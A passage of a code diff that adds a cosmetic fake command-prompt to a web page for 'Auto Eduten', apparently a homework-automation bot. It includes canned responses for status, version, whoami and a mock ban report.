+          { text: '  clear    - clear the screen', cls: 'term-dim' },
+          { text: '  status   - show bot status', cls: 'term-dim' },
+          { text: '  whoami   - show current user', cls: 'term-dim' },
+          { text: '  version  - show version info', cls: 'term-dim' },
+          { text: '  ban      - show ban details', cls: 'term-dim' }
+        ]);
+        return;
+      }
+      if (c === 'clear' || c === 'cls') {
+        var children = terminalLines.children;
+        for (var i = children.length - 1; i >= 0; i--) {
+          if (children[i] !== line) terminalLines.removeChild(children[i]);
+        }
+        return;
+      }
+      if (c === 'status') {
+        insertAbove([
+          { text: '[' + ts() + '] [FATAL] Bot status: BANNED', cls: 'term-fatal' },
+          { text: '[' + ts() + '] [WARN ] Progress: restoring from local cache...', cls: 'term-warn' },
+          { text: '[' + ts() + '] [INFO ] Tasks cached locally: ' + TASKS.length + '/' + TASKS.length, cls: 'term-ok' }
+        ]);
+        return;
+      }
+      if (c === 'whoami') {
+        insertAbove([{ text: 'autoeduten\\bot', cls: 'term-dim' }]);
+        return;
+      }
+      if (c === 'version') {
+        insertAbove([
+          { text: 'Auto Eduten v4.0.3 — Browser Edition', cls: 'term-ok' },
+          { text: 'Build: 4127', cls: 'term-dim' },
+          { text: 'Node: n/a (browser runtime)', cls: 'term-dim' }
+        ]);
+        return;
+      }
+      if (c === 'ban') {
+        insertAbove([
+          { text: '=== BAN REPORT ===', cls: 'term-fatal' },
+          { text: 'Reason : Automated submission pattern detected', cls: 'term-error' },
+          { text: 'Code   : 0x0000BAN1', cls: 'term-error' },
+          { text: 'Until  : 2099-12-31 23:59:59 UTC', cls: 'term-error' },
+          { text: 'Note   : Contact your teacher to restore access.', cls: 'term-warn' }
+        ]);
+        return;
+      }
+      if (c === 'exit') {
+        insertAbove([{ text: 'Session closing...', cls: 'term-dim' }]);
+        return;
+      }
+      insertAbove([
+        { text: "'" + cmd + "' is not recognized as an internal or external command,", cls: 'term-error' },
+        { text: 'operable program or batch file.', cls: 'term-error' }
+      ]);
+    }
+
+    function onKey(e) {
+      if (!inputActive) return;
+      if (e.target && (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA')) return;
+
+      if (e.key === 'Enter') {
+        e.preventDefault();
+        var echo = document.createElement('div');
+        echo.className = 'term-line term-prompt';
+        echo.textContent = 'C:\\AutoEduten> ' + buffer;
+        terminalLines.insertBefore(echo, line);
+
+        var cmd = buffer;
+        buffer = '';
+        typedEl.textContent = '';
+
+        handleCommand(cmd);
+        scrollBottom();
+        return;
+      }
+      if (e.key === 'Backspace') {
+        e.preventDefault();
+        if (buffer.length > 0) {
+          buffer = buffer.slice(0, -1);
+          typedEl.textContent = buffer;
+        }
+        return;
+      }
+      if (e.key === 'Escape') {
+        e.preventDefault();
+        buffer = '';
+        typedEl.textContent = '';
+        return;
+      }
+      if (e.key.length === 1 && !e.ctrlKey && !e.metaKey && !e.altKey) {
+        e.preventDefault();
+        buffer += e.key;
+        typedEl.textContent = buffer;
+        scrollBottom();
+      }
+    }
+
+    document.addEventListener('keydown', onKey);
+  }
 
 })();
 </script>
+
 </body>
 </html>
